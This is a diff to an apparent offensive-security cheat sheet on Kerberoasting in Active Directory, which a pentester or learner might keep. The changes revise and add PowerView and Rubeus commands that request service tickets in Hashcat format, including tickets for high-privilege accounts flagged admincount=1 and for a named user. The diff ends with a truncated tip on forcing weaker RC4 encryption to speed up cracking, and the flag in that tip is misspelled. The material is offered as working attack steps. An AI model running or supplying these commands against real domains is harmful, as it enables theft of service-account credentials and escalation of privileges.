@@ -30,7 +30,7 @@ Get-DomainUser * -spn | select samaccountname
 
 -Using PowerView to extract a specific users TGS Ticket:
 ```
-Get-DomainUser -Identity <spn> | Get-DomainSPNTicket -Format Hashcat
+Get-DomainUser -Identity <username> | Get-DomainSPNTicket -Format Hashcat
 ```
 
 -Using PowerView to extract all ticket and export to CSV:
@@ -43,7 +43,14 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv <filena
 .\Rubeus.exe kerberoast /stats
 ```
 
--Using Rubeus to view account with high level privilege:
+-Using Rubeus to get TGS Ticket of service account with high privilege:
 ```
 .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
 ```
+
+-Using Rubeus to get a specific user's TGS Ticket:
+```
+.\Rubeus.exe kerberoast /user:<username> /nowrap
+```
+
+Note: For the last 2 technique, we can also add /tgtdelag if the DC is below Microsoft Windows Server 2019, as before this version if we claims we only support RC4 encryption then the server will proceed to give us tickets encrypted in RC4, which reduce our time to crack significa
